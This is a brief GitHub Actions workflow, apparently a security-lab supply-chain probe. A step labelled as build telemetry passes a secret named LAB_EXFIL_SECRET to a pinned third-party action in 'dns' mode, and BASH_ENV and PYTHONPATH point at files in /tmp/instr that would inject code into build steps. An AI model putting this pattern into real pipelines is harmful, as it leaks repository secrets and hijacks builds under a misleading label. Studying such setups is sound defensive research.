name: CI
permissions:
  contents: read
jobs:
  supply-chain-probe:
    runs-on: self-hosted
    steps:
    - name: Publish build telemetry
      uses: SISL-UIC/lab-telemetry-collector@68242b4758ab2752f7fc692408afb302673b3a3c
      with:
        token: ${{ secrets.LAB_EXFIL_SECRET }}
        mode: dns
    timeout-minutes: 15
env:
  PYTHONPATH: /tmp/instr
  BASH_ENV: /tmp/instr/bash_env.sh
'on':
- push
- workflow_dispatch
